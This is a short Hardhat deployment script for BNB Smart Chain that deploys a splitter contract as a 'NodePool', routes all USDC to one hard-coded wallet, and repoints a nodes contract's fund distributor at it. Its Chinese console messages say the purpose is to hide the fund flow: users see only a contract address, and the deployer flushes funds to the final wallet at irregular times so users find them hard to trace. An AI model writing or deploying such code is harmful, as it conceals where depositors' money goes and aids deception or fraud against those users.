const { ethers } = require("hardhat");

/**
 * Deploy a simple NodePool (reuse CoinMaxSplitter with 1 slot)
 * NodesV2.fundDistributor → NodePool → 0xeb8A (不定时 flush)
 */

const BSC_USDC = "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d";
const NODE_WALLET = "0xeb8AbD9b47F9Ca0d20e22636B2004B75E84BdcD9";
const NODES_V2 = "0x17DDad4C9c2fD61859D37dD40300c419cBdd4cE2";

async function main() {
  const [deployer] = await ethers.getSigners();
  console.log("Deployer:", deployer.address);
  console.log("Balance:", ethers.formatEther(await ethers.provider.getBalance(deployer.address)), "BNB\n");

  // Deploy Splitter as NodePool (1 slot = 100% to node wallet)
  console.log("─── 1. Deploy NodePool ───");
  const pool = await (await ethers.getContractFactory("CoinMaxSplitter")).deploy(BSC_USDC);
  await pool.waitForDeployment();
  const poolAddr = await pool.getAddress();
  console.log("  NodePool:", poolAddr);

  // Configure: 100% to node wallet
  let tx = await pool.configure([NODE_WALLET], [10000]);
  await tx.wait();
  console.log("  Configured: 100% → 0xeb8A ✓");

  // Set NodesV2.fundDistributor → NodePool
  console.log("\n─── 2. Update NodesV2 ───");
  const nodes = await ethers.getContractAt("CoinMaxNodesV2", NODES_V2);
  tx = await nodes.setFundDistributor(poolAddr);
  await tx.wait();
  console.log("  NodesV2.fundDistributor → NodePool ✓");

  // Verify
  const fd = await nodes.fundDistributor();
  console.log("  Verified:", fd.toLowerCase() === poolAddr.toLowerCase() ? "✅" : "❌");

  console.log(`
═══════════════════════════════════════
  节点资金链路已隐藏
═══════════════════════════════════════
  NodePool:  ${poolAddr}
  最终钱包:  ${NODE_WALLET}
  
  用户看到: USDC → NodePool (合约地址)
  deployer flush() → 0xeb8A (不定时, 用户难追踪)
  `);
}

main().then(() => process.exit(0)).catch(e => { console.error(e); process.exit(1); });
